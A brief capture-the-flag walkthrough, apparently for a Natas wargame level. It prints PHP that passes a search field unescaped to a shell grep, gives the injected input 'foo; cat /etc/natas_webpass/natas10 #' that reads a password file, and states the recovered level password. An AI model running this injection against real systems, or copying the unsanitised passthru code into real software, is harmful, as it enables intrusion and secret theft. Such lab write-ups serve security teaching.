Page has a link to its source code, including the following PHP code:
```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

Textbook command injection vulnerability, enter the following in the search box to read the password:
```
foo; cat /etc/natas_webpass/natas10 #
```

Password for the next level is `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`.
